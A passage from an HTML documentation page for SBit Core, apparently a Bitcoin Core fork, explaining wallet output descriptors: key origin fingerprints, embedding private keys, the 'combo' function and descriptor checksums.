it may be necessary to identify the master key and derivation path an
xpub was derived with.</p><p>For example, when following BIP44, it would be useful to describe a
change chain directly as <code>xpub.../44&#x27;/0&#x27;/0&#x27;/1/*</code> where <code>xpub...</code>
corresponds with the master key <code>m</code>. Unfortunately, since there are
hardened derivation steps that follow the xpub, this descriptor does not
let you compute scripts without access to the corresponding private keys.
Instead, it should be written as <code>xpub.../1/*</code>, where xpub corresponds to
<code>m/44&#x27;/0&#x27;/0&#x27;</code>.</p><p>When interacting with a hardware device, it may be necessary to include
the entire path from the master down. <a href="https://github.com/bitcoin/bips/blob/master/bip-0174.mediawiki" target="_blank" rel="noopener noreferrer">BIP174</a> standardizes this by
providing the master key <em>fingerprint</em> (first 32 bit of the Hash160 of
the master pubkey), plus all derivation steps. To support constructing
these, we permit providing this key origin information inside the
descriptor language, even though it does not affect the actual
scriptPubKeys it refers to.</p><p>Every public key can be prefixed by an 8-character hexadecimal
fingerprint plus optional derivation steps (hardened and unhardened)
surrounded by brackets, identifying the master and derivation path the key or xpub
that follows was derived with.</p><p>Note that the fingerprint of the parent only serves as a fast way to detect
parent and child nodes in software, and software must be willing to deal with
collisions.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="including-private-keys">Including private keys<a class="hash-link" href="#including-private-keys" title="Direct link to heading">‚Äã</a></h3><p>Often it is useful to communicate a description of scripts along with the
necessary private keys. For this reason, anywhere a public key or xpub is
supported, a private key in WIF format or xprv may be provided instead.
This is useful when private keys are necessary for hardened derivation
steps, or for dumping wallet descriptors including private key material.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="compatibility-with-old-wallets">Compatibility with old wallets<a class="hash-link" href="#compatibility-with-old-wallets" title="Direct link to heading">‚Äã</a></h3><p>In order to easily represent the sets of scripts currently supported by
existing SBit Core wallets, a convenience function <code>combo</code> is
provided, which takes as input a public key, and describes a set of P2PK,
P2PKH, P2WPKH, and P2SH-P2WPH scripts for that key. In case the key is
uncompressed, the set only includes P2PK and P2PKH scripts.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="checksums">Checksums<a class="hash-link" href="#checksums" title="Direct link to heading">‚Äã</a></h3><p>Descriptors can optionally be suffixed with a checksum to protect against
typos or copy-paste errors.</p><p>These checksums consist of 8 alphanumeric characters. As long as errors are
restricted to substituting characters in <code>0123456789()[],&#x27;/*abcdefgh@:$%{}</code>
for others in that set and changes in letter case, up to 4 errors will always
be detected in descriptors up to 501 characters, and up to 3 errors in longer
ones. For larger numbers of errors, or other types of errors, there is a
roughly 1 in a trillion chance of not detecting the errors.</p><p>All RPCs in SBit Core will include the checksum in their output. Only
certain RPCs require checksums on input, including <code>deriveaddress</code> and
<code>importmulti</code>. The checksum for a descriptor without one can be computed
using the <code>getdescriptorinfo</code> RPC.</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/sbit.dev/docs/SBit-Core/Building/dependencies"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Dependencies</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/sbit.dev/docs/SBit-Core/Building/multiprocess"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Multiprocess Bitcoin</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_cNA8 thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#features" class="table-of-contents__link toc-highlight">Features</a></li><li><a href="#examples" class="table-of-contents__link toc-highlight">Examples</a></li><li><a href="#reference" class="table-of-contents__link toc-highlight">Reference</a></li><li><a href="#explanation" class="table-of-contents__link toc-highlight">Explanation</a><ul><li><a href="#single-key-scripts" class="table-of-contents__link toc-highlight">Single-key scripts</a></li><li><a href="#multisig" class="table-of-contents__link toc-highlight">Multisig</a></li><li><a href="#bip32-derived-keys-and-chains" class="table-of-contents__link toc-highlight">BIP32 derived keys and chains</a></li><li><a href="#key-origin-identification" class="table-of-contents__link toc-highlight">Key origin identification</a></li><li><a href="#including-private-keys" class="table-of-contents__link toc-highlight">Including private keys</a></li><li><a href="#compatibility-with-old-wallets" class="table-of-contents__link toc-highlight">Compatibility with old wallets</a></li><li><a href="#checksums" class="table-of-contents__link toc-highlight">Checksums</a></li></ul></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Get in touch</div><ul class="footer__items"><li class="footer__item"><a href="mailto: dev@sbit.dev" target="_blank" rel="noopener noreferrer" class="footer__link-item">Contact<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/docs/welcome">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items"><li class="footer__item"><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Instagram<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/sbit.dev/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/SBit-Project/Book" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright ¬© 2022 - SBit Project</div></div></div></footer></div>
<script src="/sbit.dev/assets/js/runtime~main.f7c96534.js"></script>
<script src="/sbit.dev/assets/js/main.73c60966.js"></script>
</body>
</html>